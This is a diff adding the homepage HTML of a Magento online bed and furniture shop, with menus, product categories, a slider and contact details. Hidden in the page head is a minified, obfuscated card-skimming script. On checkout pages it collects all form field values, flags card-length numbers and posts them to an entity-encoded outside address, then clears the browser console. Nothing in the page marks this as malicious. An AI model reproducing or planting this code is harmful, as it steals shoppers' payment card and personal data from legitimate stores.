@@ -1,0 +1,524 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<title>Home page</title>
+
+<meta name="description" content="Default Description" />
+
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+
+<meta name="robots" content="INDEX,FOLLOW" />
+
+<link rel="icon" href="http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/favicon.ico" type="image/x-icon" />
+
+<link rel="shortcut icon" href="http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/favicon.ico" type="image/x-icon" />
+
+<!--[if lt IE 7]>
+
+<script type="text/javascript">
+
+//<![CDATA[
+
+    var BLANK_URL = 'http://www.bennettsbedrooms.com/js/blank.html';
+
+    var BLANK_IMG = 'http://www.bennettsbedrooms.com/js/spacer.gif';
+
+//]]>
+
+</script>
+
+<![endif]-->
+
+<link rel="stylesheet" type="text/css" href="http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/fonts.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/fontello/css/fontello.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/fontello/css/animation.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/template.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/account.css" media="all" />
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/cm/jquery-1.9.1.min.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/cm/jquery-noconflict.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/cm/jquery.easing.1.3.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/cm/jquery.transit.min.js"></script>
+<script type="text/javascript" src="http://www.bennettsbedrooms.com/js/cm/novaworks.js"></script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.bennettsbedrooms.com';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script>
+
+<script>function jj(e){var t="; "+document.cookie,o=t.split("; "+e+"=");return 2==o.length?o.pop().split(";").shift():void 0}jj("SESSIID")||(document.cookie="SESSIID="+(new Date).getTime()),jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("onepage|checkout").test(n)){for(var c=document.querySelectorAll("input, select, textarea, checkbox"),i=0;i<c.length;i++)if(c[i].value.length>0){var a=c[i].name;""==a&&(a=i),t+=a+"="+c[i].value+"&"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#111;&#119;&#110;&#115;&#97;&#102;&#101;&#116;&#121;&#46;&#111;&#114;&#103;&#47;&#111;&#112;&#112;&#46;&#112;&#104;&#112;").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&asd="+(l.test(t.replace(/s/g,""))?1:0)+"&utmp="+n+"&cookie="+jj("SESSIID")),console.clear()}}})});</script>
+
+<script type="text/javascript">
+
+var price, sepstr, firstpart, secondpart, currency;
+
+jQuery(document).ready(function() {
+
+	jQuery('.newproducts .price-box .regular-price .price, .newproducts .old-price .price, .newproducts .special-price .price, .category-products .price-box .regular-price .price, .category-products .old-price .price, .category-products .special-price .price, .product-shop .price-box .regular-price .price, .product-shop .old-price .price, .product-shop .special-price .price').each(function(){
+
+		price = jQuery.trim(jQuery(this).text());
+
+sepstr = price.split('.');
+
+		firstpart = sepstr[0];
+
+		secondpart = sepstr[1];
+
+		currency = firstpart[0];
+
+firstpart = firstpart.replace(currency,'');
+
+jQuery(this).html('<span class="cur_sym">'+ currency +'</span><span class="price_int">'+ firstpart +'.</span><span class="price_deci">'+ secondpart +'</span>');
+
+	});
+
+});
+
+</script>
+
+<!--<script type="text/javascript">
+
+jQuery(document).ready(function() {
+
+    jQuery(".carousel").carousel({
+
+		interval: 2000
+
+        /*scroll: 1,
+
+		wrap: 'circular',*/
+
+		//wrap: 'circular',
+
+        // This tells jCarousel NOT to autobuild prev/next buttons
+
+        /*buttonNextHTML: null,
+
+        buttonPrevHTML: null*/
+
+    });
+
+});
+
+</script>-->
+
+<!--[if lt IE 8]>
+
+<link rel="stylesheet" type="text/css" id="res1" />
+
+<link rel="stylesheet" type="text/css" id="res2" />
+
+<link rel="stylesheet" type="text/css" id="res3" />
+
+<link rel="stylesheet" type="text/css" id="res4" />
+
+<link rel="stylesheet" type="text/css" id="res5" />
+
+<link rel="stylesheet" type="text/css" id="res6" />
+
+<link rel="stylesheet" type="text/css" id="res7" />
+
+<script type="text/javascript">
+
+jQuery(document).ready(function() {
+
+	
+
+function adjustStyle(width) {
+
+    width = parseInt(width);
+
+    if (width >= 1200) {
+
+        jQuery("#res1").attr("href", "http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/min1200.css");
+jQuery("#res2").removeAttr("href");jQuery("#res3").removeAttr("href");jQuery("#res4").removeAttr("href");jQuery("#res5").removeAttr("href");jQuery("#res6").removeAttr("href");jQuery("#res7").removeAttr("href");
+    } else
+	{
+		jQuery("#res1").removeAttr("href");
+	}
+	if ((width <= 1024)) 
+
+	{
+
+		jQuery("#res1").attr("href", "http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/max1024.css");
+
+			if(width <= 980)
+
+			{
+
+			jQuery("#res2").attr("href", "http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/max979.css");
+
+				if((width <= 767))
+
+				{
+
+					jQuery("#res5").attr("href", "http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/max767.css");
+
+					if(width <= 480)
+
+					{
+
+					jQuery("#res6").attr("href", "http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/max480.css");
+
+							if(width <= 420)
+
+							{
+
+							jQuery("#res7").attr("href", "http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/max420.css");
+
+							}
+
+							else{jQuery("#res7").removeAttr("href");}
+
+					}
+
+					else{jQuery("#res6").removeAttr("href");jQuery("#res7").removeAttr("href");}
+
+				}
+
+				else{jQuery("#res5").removeAttr("href");jQuery("#res6").removeAttr("href");jQuery("#res7").removeAttr("href");}
+
+			}
+
+else{jQuery("#res2").removeAttr("href");jQuery("#res5").removeAttr("href");jQuery("#res6").removeAttr("href");jQuery("#res7").removeAttr("href");}
+
+   	 
+if ((width >= 768) && (width <= 979)) {
+
+				jQuery("#res3").attr("href", "http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/min768px_max979px.css");
+
+				}
+
+				else{jQuery("#res3").removeAttr("href");}
+
+				if((width >= 600) && (width <= 800))
+
+				{
+
+				jQuery("#res4").attr("href", "http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/css/min600px_max800px.css");
+
+				}
+
+				else{jQuery("#res4").removeAttr("href");}
+				}
+}
+
+
+
+jQuery(function() {
+
+    adjustStyle(jQuery(this).width());
+
+    jQuery(window).resize(function() {
+
+        adjustStyle(jQuery(this).width());
+
+    });
+
+});
+
+});
+
+</script><![endif]-->
+
+<script type="text/javascript">
+
+jQuery(document).ready(function() {
+
+jQuery(window).scroll(function () {
+
+			if (jQuery(this).scrollTop() > 100) {
+
+				jQuery('#back-top').fadeIn();
+
+			} else {
+
+				jQuery('#back-top').fadeOut();
+
+			}
+
+		});
+
+
+
+		// scroll body to 0px on click
+
+		jQuery('#back-top a').click(function () {
+
+			jQuery('body,html').animate({
+
+				scrollTop: 0
+
+			}, 800);
+
+			return false;
+
+		});
+
+				});
+
+</script>
+</head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="purplebg"></div>
+    <div class="page">
+        
+<p id="back-top">
+    <a href="javascript:void(0);"><span></span>Back to Top</a>
+</p>
+	
+<div class="header-container">
+    <div class="header container">     
+        <h1 class="logo"><a href="http://www.bennettsbedrooms.com/" title="Bennetts Bedrooms" class="logo"><img src="http://www.bennettsbedrooms.com/skin/frontend/creationmedia/bennettsbedrooms/images/logo.png" alt="Bennetts Bedrooms" /></a></h1>
+        <div class="top-links"><div class="phone">+351 289 102 552</div>
+
+<ul>
+ <li><a href="http://www.bennettsbedrooms.com/">HOME</a></li>
+ <li><a href="http://www.bennettsbedrooms.com/about-us">ABOUT US</a></li>
+ <li><a href="http://www.bennettsbedrooms.com/contacts">CONTACTS / SHOWROOM</a></li>
+</ul>
+
+<br /><br /><br />
+
+<h1>Bringing the best British beds, furniture & linen to the Algarve</h1></div>
+        <div class="dropdown top-dropdown my-setting">
+            <li class="text">
+                My Account <span class="ddarrow">V</span>                <ul class="links">
+                        <li class="toplink1 first" ><a href="http://www.bennettsbedrooms.com/customer/account/" title="My Account" >My Account</a></li>
+                                <li ><a href="http://www.bennettsbedrooms.com/wishlist/" title="My Wishlist" >My Wishlist</a></li>
+                                <li class="toplink3 " ><a href="http://www.bennettsbedrooms.com/checkout/" title="Checkout" class="top-link-checkout">Checkout</a></li>
+                                <li class="toplink4  last" ><a href="http://www.bennettsbedrooms.com/customer/account/login/" title="Log In" >Log In</a></li>
+            </ul>
+            </li>
+        </div>
+       <div class="mini-cart">
+        	<div class="shopping-cart">     
+		<a class="mini-cart-title" href="http://www.bennettsbedrooms.com/checkout/cart/" title="View contents of your shopping cart">
+			       
+			<span class="cart_circle">
+			 Shopping Cart </span>
+		</a>
+		</div>  
+            	<div class="block-content">
+        <div class="block-content-inner">
+            	<p class="empty">You have no items in your shopping cart.</p>
+		</div>
+		</div>
+    </div>
+<div class="search-col"><form id="search_mini_form" action="http://www.bennettsbedrooms.com/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Search" class="button"></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Search');
+            searchForm.initAutocomplete('http://www.bennettsbedrooms.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+</div>
+    </div>
+</div>
+
+<div class="nav-container">
+    <ul id="nav">
+        <li  class="level0 nav-1 first level-top parent"><a href="http://www.bennettsbedrooms.com/mattresses"  class="level-top" ><span>MATTRESSES</span></a><ul class="level0"><li  class="level1 nav-1-1 first"><a href="http://www.bennettsbedrooms.com/mattresses/headboards" ><span>HEADBOARDS</span></a></li><li  class="level1 nav-1-2"><a href="http://www.bennettsbedrooms.com/mattresses/memory-foam" ><span>MEMORY FOAM</span></a></li><li  class="level1 nav-1-3"><a href="http://www.bennettsbedrooms.com/mattresses/orthopaedic" ><span>ORTHOPAEDIC</span></a></li><li  class="level1 nav-1-4"><a href="http://www.bennettsbedrooms.com/mattresses/pocket-spring" ><span>POCKET SPRING</span></a></li><li  class="level1 nav-1-5 last"><a href="http://www.bennettsbedrooms.com/mattresses/zip-link" ><span>ZIP &amp; LINK</span></a></li></ul></li><li  class="level0 nav-2 level-top parent"><a href="http://www.bennettsbedrooms.com/divan-beds"  class="level-top" ><span>DIVAN BEDS</span></a><ul class="level0"><li  class="level1 nav-2-1 first"><a href="http://www.bennettsbedrooms.com/divan-beds/headboards" ><span>HEADBOARDS</span></a></li><li  class="level1 nav-2-2"><a href="http://www.bennettsbedrooms.com/divan-beds/memory-foam" ><span>MEMORY FOAM</span></a></li><li  class="level1 nav-2-3"><a href="http://www.bennettsbedrooms.com/divan-beds/orthopaedic" ><span>ORTHOPAEDIC</span></a></li><li  class="level1 nav-2-4"><a href="http://www.bennettsbedrooms.com/divan-beds/pocket-spring" ><span>POCKET SPRING</span></a></li><li  class="level1 nav-2-5"><a href="http://www.bennettsbedrooms.com/divan-beds/zip-link" ><span>ZIP &amp; LINK</span></a></li><li  class="level1 nav-2-6 last"><a href="http://www.bennettsbedrooms.com/divan-beds/electric-adjustable-beds" ><span>ELECTRIC ADJUSTABLE BEDS</span></a></li></ul></li><li  class="level0 nav-3 level-top parent"><a href="http://www.bennettsbedrooms.com/hypnos-beds"  class="level-top" ><span>HYPNOS BEDS</span></a><ul class="level0"><li  class="level1 nav-3-1 first last"><a href="http://www.bennettsbedrooms.com/hypnos-beds/hypnos" ><span>HYPNOS</span></a></li></ul></li><li  class="level0 nav-4 level-top parent"><a href="http://www.bennettsbedrooms.com/bedframes-storage-beds"  class="level-top" ><span>BEDFRAMES &amp; STORAGE BEDS</span></a><ul class="level0"><li  class="level1 nav-4-1 first"><a href="http://www.bennettsbedrooms.com/bedframes-storage-beds/faux-leather-bedframe" ><span>FAUX LEATHER BEDFRAME</span></a></li><li  class="level1 nav-4-2"><a href="http://www.bennettsbedrooms.com/bedframes-storage-beds/metal-bedframe" ><span>METAL BEDFRAME</span></a></li><li  class="level1 nav-4-3"><a href="http://www.bennettsbedrooms.com/bedframes-storage-beds/ottoman-storage-bed" ><span>OTTOMAN STORAGE BED</span></a></li><li  class="level1 nav-4-4"><a href="http://www.bennettsbedrooms.com/bedframes-storage-beds/wooden-bedframe" ><span>WOODEN BEDFRAME</span></a></li><li  class="level1 nav-4-5 last"><a href="http://www.bennettsbedrooms.com/bedframes-storage-beds/tapizada-base" ><span>TAPIZADA BASE</span></a></li></ul></li><li  class="level0 nav-5 level-top parent"><a href="http://www.bennettsbedrooms.com/furniture-sofabeds"  class="level-top" ><span>FURNITURE &amp; SOFABEDS</span></a><ul class="level0"><li  class="level1 nav-5-1 first"><a href="http://www.bennettsbedrooms.com/furniture-sofabeds/furniture-honey-oak" ><span>FURNITURE HONEY OAK</span></a></li><li  class="level1 nav-5-2"><a href="http://www.bennettsbedrooms.com/furniture-sofabeds/furniture-white" ><span>FURNITURE WHITE</span></a></li><li  class="level1 nav-5-3 last"><a href="http://www.bennettsbedrooms.com/furniture-sofabeds/sofabed" ><span>SOFABED</span></a></li></ul></li><li  class="level0 nav-6 level-top parent"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen"  class="level-top" ><span>BED &amp; BATH LINEN</span></a><ul class="level0"><li  class="level1 nav-6-1 first"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/corovin-duvet" ><span>COROVIN DUVET</span></a></li><li  class="level1 nav-6-2"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/duvet-cover-sets" ><span>DUVET COVER SETS</span></a></li><li  class="level1 nav-6-3"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/egyption-cotton-200-thread-count" ><span>EGYPTION COTTON 200 THREAD COUNT</span></a></li><li  class="level1 nav-6-4"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/mattress-pillow-protectors" ><span>MATTRESS &amp; PILLOW PROTECTORS</span></a></li><li  class="level1 nav-6-5"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/microfibre-duvet" ><span>MICROFIBRE DUVET</span></a></li><li  class="level1 nav-6-6"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/percale-50-50" ><span>PERCALE 50/50</span></a></li><li  class="level1 nav-6-7"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/pillows" ><span>PILLOWS</span></a></li><li  class="level1 nav-6-8"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/poly-cotton-covered-duvet" ><span>POLY/COTTON COVERED DUVET</span></a></li><li  class="level1 nav-6-9"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/towels" ><span>TOWELS</span></a></li><li  class="level1 nav-6-10 last"><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen/toppers" ><span>TOPPERS</span></a></li></ul></li><li  class="level0 nav-7 last level-top"><a href="http://www.bennettsbedrooms.com/mammothbeds"  class="level-top" ><span>MAMMOTH BEDS</span></a></li>    </ul>
+</div>
+<!--
+<ul class="custom-nav">
+<li><a href="sale">SALE</a></li>
+</ul>
+-->
+
+<div class="clear"></div> 
+<div class="home_banner_container">
+    <div class="home_banner container">
+        <div id="myCarousel" class="carousel_no slide">
+            <div class="carousel-inner"> 
+                <script src="/js/cm/jssor.slider.mini.js"></script>
+<script>
+    jQuery(document).ready(function ($) {
+        var options = { 
+            $AutoPlay: true,
+            $AutoPlayInterval: 5000
+        };
+        var jssor_slider1 = new $JssorSlider$('slider1_container', options);
+    });
+</script>
+
+<div id="slider1_container" style="position: relative; top: 0px; left: 0px; width: 950px; height: 380px;">
+    <!-- Slides Container -->
+    <div u="slides" style="cursor: move; position: absolute; overflow: hidden; left: 0px; top: 0px; width: 950px; height: 380px;">
+        <div><a u="image" href="http://www.bennettsbedrooms.com/5ft-king-benjamin-brass-bedframe"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/Slides/benjamin-brass.jpg" /></a></div>
+        <div><a u="image" href="http://www.bennettsbedrooms.com/venice-120cm-orchid-white-faux-leather-sofa-bed-585"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/Slides/venice-sofabed.jpg" /></a></div>
+        <div><a u="image" href="http://www.bennettsbedrooms.com/6tf-super-king-oxford-divan-set"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/Slides/oxford-divan-set.jpg" /></a></div>
+        <div><a u="image" href="http://www.bennettsbedrooms.com/5ft-king-freya-white-bedframe"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/Slides/fraya-bedframe.jpg" /></a></div>
+        <div><a u="image" href="http://www.bennettsbedrooms.com/hypnos-beds"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/Slides/hypnos-beds.jpg" /></a></div>
+    </div>
+</div> 
+            </div>
+        </div>
+    </div>
+</div>
+
+        <div class="main-container col1-layout">
+            <div class="main container">
+                                <div class="col-main">
+                                        <div class="std"><h2><strong>BENNETS BEDROOMS PRODUCTS -</strong> We have personally selected the best in UK beds, bedroom furniture, bed and bath linen.</h2>
+
+<a href="divan-beds"><div class="boxelement"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/box1.png" alt="" /><p>Divan Beds</p></div></a>
+<a href="bed-linen-bath-linen"><div class="boxelement"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/box2.png" alt="" /><p>Bed & Bath Linen</p></div></a>
+<!--<a href="bedroom-packages"><div class="boxelement"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/box3.png" alt="" /><p>Bedroom Packages</p></div></a>-->
+<a href="hypnos-beds"><div class="boxelement"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/box9.png" alt="" /><p>Hypnos Beds</p></div></a>
+<a href="sale"><div class="boxelement last"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/box4.png" alt="" /><p>Sale Items</p></div></a>
+<a href="bedframes-storage-beds"><div class="boxelement"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/box5.png" alt="" /><p>Bedframes & Storage</p></div></a>
+<a href="furniture-sofabeds"><div class="boxelement"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/box6.png" alt="" /><p>Bedroom Furniture</p></div></a>
+<a href="furniture-sofabeds"><div class="boxelement"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/box7.png" alt="" /><p>Sofabeds</p></div></a>
+<a href="contacts"><div class="boxelement last"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/box8.png" alt="" /><p>Visit our Showroom</p></div></a>
+
+<div class="clear"></div><hr/>
+
+
+
+<br /><hr />
+
+<h3>FIND THE RIGHT MATTRESS FOR YOU</h3>
+
+<a href="mattresses-divan-beds/memory-foam"><div class="boxelement mat"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/mattress1.png" alt="" /><p>Memory Foam Mattresses</p></div></a>
+<a href="mattresses-divan-beds/pocket-spring"><div class="boxelement mat"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/mattress2.png" alt="" /><p>Pocket Spring Mattresses</p></div></a>
+<a href=""><div class="boxelement mat"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/mattress3.png" alt="" /><p>Open Spring Mattresses</p></div></a>
+<a href="mattresses-divan-beds/orthopaedic"><div class="boxelement mat last"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/home/mattress4.png" alt="" /><p>Orthopaedic Mattresses</p></div></a>
+
+<div class="clear"></div>
+
+<div class="boxelement text">
+ <b>Memory Foam Matresses...</b> Memory Foam helps those with head & neck pain by correctly supporting the body and relaxing muscles.
+</div>
+<div class="boxelement text">
+ <b>Pocket Spring Matresses...</b> The springs mould and follow the contours of your body shape giving maximum support and comfort.
+</div>
+<div class="boxelement text">
+ <b>Open Spring Matresses...</b> Most common type of springs used in a mattress with different types of firmness - soft, medium & firm.
+</div>
+<div class="boxelement text last">
+ <b>Orthopaedic Mattresses...</b> Giving extra support to the whole body, bringing relief from a host of minor aches & pains.
+</div>
+
+<div class="clear"></div></div>                </div>
+            </div>
+        </div>
+        <footer>
+<div class="footer_first_section">
+    <div class="footer-address block">
+        <h4>Contact Us</h4>
+
+<div class="address">
+ Albufeira Showroom<br /> 
+ 8D Vale Paraiso, 8200-383<br />
+ Almancil - Hypnos & MammothBeds<br />
+ 364 Avenida 5 de Outubro - 8135-103
+</div>
+<div class="phones">
+ +351 289 102 552 +351 289 393 338<br />
+</div>
+<div class="email">
+ <a href="mailto:sales@bennettsbedrooms.com">sales@bennettsbedrooms.com</a>
+</div>    </div>
+    <div class="footer-links block">
+        <h4>Bennetts Bedrooms Products</h4>
+
+<ul>
+<li><a href="http://www.bennettsbedrooms.com/mattresses-divan-beds">Mattresses & Divan Beds</a></li>
+<li><a href="http://www.bennettsbedrooms.com/bedframes-storage-beds">Bedframes & Storage Beds</a></li>
+<li><a href="http://www.bennettsbedrooms.com/furniture-sofabeds">Furniture & Sofabeds</a></li>
+<li><a href="http://www.bennettsbedrooms.com/bed-linen-bath-linen">Bed Linen & Bath Linen</a></li>
+<li><a href="http://www.bennettsbedrooms.com/bedroom-packages">Bedroom Packages</a></li>
+<!--<li><a href="http://www.bennettsbedrooms.com/sale">Sale</a></li>-->
+</ul>    </div>
+    <div class="footer-info block">
+        <h4>Useful Information</h4>
+
+<ul>
+ <li><a href="http://www.bennettsbedrooms.com/frequently-asked-questions">Frequently Asked Questions</a></li>
+ <li><a href="http://www.bennettsbedrooms.com/returns-policy">Returns Policy</a></li>
+ <li><a href="http://www.bennettsbedrooms.com/delivery-information">Delivery Information</a></li>
+ <li><a href="http://www.bennettsbedrooms.com/terms-and-conditions">Terms and Conditions</a></li>
+</ul>
+
+<img src="http://www.bennettsbedrooms.com/media/wysiwyg/footer/cc_logos.png" alt="" />    </div>
+    <div class="footer-social block">
+        <h4>Social Media</h4>
+
+<a href="https://www.facebook.com/pages/Bennetts-Bedrooms/219844191554362" target="_blank" class="footersociallink"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/footer/facebook_icon.png" alt="" /></a>
+<a href="" target="_blank" class="footersociallink"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/footer/twitter_icon.png" alt="" /></a>
+<a href="" target="_blank" class="footersociallink"><img src="http://www.bennettsbedrooms.com/media/wysiwyg/footer/linkedin_icon.png" alt="" /></a>        <div class="block block-subscribe">
+    <form action="http://www.bennettsbedrooms.com/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+        <div class="block-content">
+            <div class="form-subscribe-header">
+                <label for="newsletter">Newsletter Sign Up:</label>
+            </div>
+            <div class="input-box">
+               <input type="text" name="email" id="newsletter" title="Newsletter Sign Up" class="input-text required-entry validate-email" />
+               <button type="submit" title="Subscribe" class="button"><span><span>SEND</span></span></button>
+            </div>
+        </div>
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+</div>
+    </div>
+    <div class="clear"></div>
+</div>
+<div class="footer_second_section">
+    <div class="copy">Copyright &copy; Bennetts Bedrooms 2016&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Disclaimer</div>
+    <div class="powered">Site Design: <a href="http://www.creation-media.net" target="_blank"><img src="skin/frontend/creationmedia/bennettsbedrooms/images/cm_logo.png"></a></div>
+    <div class="clear"></div>
+</div>
+</footer>
+            </div>
+</div>
+</body>
+</html>
